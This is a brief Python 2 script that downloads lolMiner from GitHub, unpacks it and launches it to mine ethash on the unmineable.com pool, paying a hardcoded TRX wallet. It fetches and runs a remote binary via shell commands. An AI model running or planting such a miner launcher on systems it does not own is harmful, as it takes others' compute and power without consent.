#!/bin/python2
from os import system
from time import sleep

wall = "TPidhtNgpDDouvgE6unrLzsAbFBZW45CTj"

try:
		system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz && tar -xvf lolMiner_v1.32a_Lin64.tar.gz")
		system("echo AAAA")
		system("cd 1.32a")
		system("./1.32a/lolMiner --algo ethash --pool  ethash.unmineable.com:3333 --user TRX:{}.MinerMiq --tls 0".format(str(wall)))
except Exception as err:
		print(" Error: ", err)
